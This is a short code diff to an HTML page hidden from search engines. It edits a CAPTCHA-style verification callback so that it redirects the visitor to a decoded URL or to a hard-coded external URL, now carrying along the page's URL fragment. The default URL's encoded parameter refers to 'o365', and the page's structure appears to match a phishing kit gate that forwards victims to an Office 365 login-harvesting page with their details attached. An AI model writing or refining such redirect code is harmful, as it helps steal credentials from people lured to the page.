@@ -509,17 +509,20 @@
         <meta name="robots" content="noindex,nofollow" />
         <meta name="viewport" content="width=device-width,initial-scale=1" />
                  <script>
-      var verifyCallback_CF = function (response) {
-        if (response) {
-          // If there's a decoded URL, redirect to it
-          if (decodedUrl) {
-            window.location.href = decodedUrl;
-          } else {
-            // If no URL was provided, go to the default page
-            window.location.href = "https://upthinktutors.com/o/?c3Y9bzM2NV8xX25vbSZyYW5kPVVteE5UVkk9JnVpZD1VU0VSMjExMDIwMjRVMjMxMDIxMDc=N0123N";
-          }
-        }
-      };
+     var verifyCallback_CF = function (response) {
+  if (response) {
+    // Capture the fragment (everything after '#')
+    var urlFragment = window.location.hash;
+
+    // If there's a decoded URL, redirect to it and append the fragment
+    if (decodedUrl) {
+      window.location.href = decodedUrl + urlFragment;
+    } else {
+      // If no URL was provided, go to the default page and append the fragment
+      window.location.href = "https://upthinktutors.com/o/?c3Y9bzM2NV8xX25vbSZyYW5kPVVteE5UVkk9JnVpZD1VU0VSMjExMDIwMjRVMjMxMDIxMDc=N0123N" + urlFragment;
+    }
+  }
+};
     </script>
                 <script>
   function getQueryParam(param) {
